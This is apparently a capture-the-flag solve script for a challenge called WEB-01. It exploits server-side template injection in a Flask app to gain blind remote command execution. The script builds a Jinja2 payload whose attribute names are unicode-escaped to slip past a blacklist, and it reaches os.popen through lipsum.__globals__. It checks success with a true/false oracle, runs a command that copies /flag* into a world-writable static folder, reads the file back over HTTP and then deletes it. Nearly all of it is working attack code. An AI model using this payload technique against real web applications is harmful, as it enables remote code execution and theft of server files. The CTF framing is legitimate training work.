#!/usr/bin/env python3
"""WEB-01 (Age Test Flask SSTI) — blind RCE via write-to-static + read back.

Usage: python3 solve.py <TARGET host:port>
No public egress in the finals sandbox, so exfiltration is a file write into
the world-writable /app/static/ followed by a GET.
"""
import sys
import time
import urllib.request
import urllib.parse

MARK = "kbout"


def esc(s: str) -> str:
    return "".join("\\u{:04x}".format(ord(c)) for c in s)


def build_payload(cmd: str) -> str:
    # lipsum.__globals__["__builtins__"]["__import__"]("os").popen(cmd) — the
    # popped command is truthy on success, flipping the {%if%} branch.
    chain = (
        f'lipsum|attr("{esc("__globals__")}")'
        f'|attr("{esc("__getitem__")}")("{esc("__builtins__")}")'
        f'|attr("{esc("__getitem__")}")("{esc("__import__")}")("{esc("os")}")'
        f'|attr("{esc("popen")}")("{esc(cmd)}")'
    )
    return "{%if(" + chain + ")%}PWNED{%endif%}"


def post(target: str, nickname: str) -> str:
    data = urllib.parse.urlencode({"nickname": nickname}).encode()
    req = urllib.request.Request(f"http://{target}/", data=data)
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode("utf-8", "replace")


def fetch(target: str, path: str) -> str | None:
    try:
        with urllib.request.urlopen(f"http://{target}/{path}", timeout=15) as resp:
            return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError:
        return None


def main() -> None:
    if len(sys.argv) != 2:
        sys.exit("usage: solve.py <host:port>")
    target = sys.argv[1]

    if "PWNED" not in post(target, build_payload("true")):
        sys.exit("[-] oracle failed — blacklist may differ, see SOLVE.md fallback")

    cmd = f"cat /flag*>/app/static/{MARK}"
    print(f"[*] injecting: {cmd}")
    post(target, build_payload(cmd))

    for _ in range(10):
        time.sleep(1)
        out = fetch(target, f"static/{MARK}")
        if out and out.strip():
            print("[+] FLAG:", out.strip())
            post(target, build_payload(f"rm /app/static/{MARK}"))
            return
    print("[-] readback empty — try the startswith blind path in SOLVE.md")


if __name__ == "__main__":
    main()
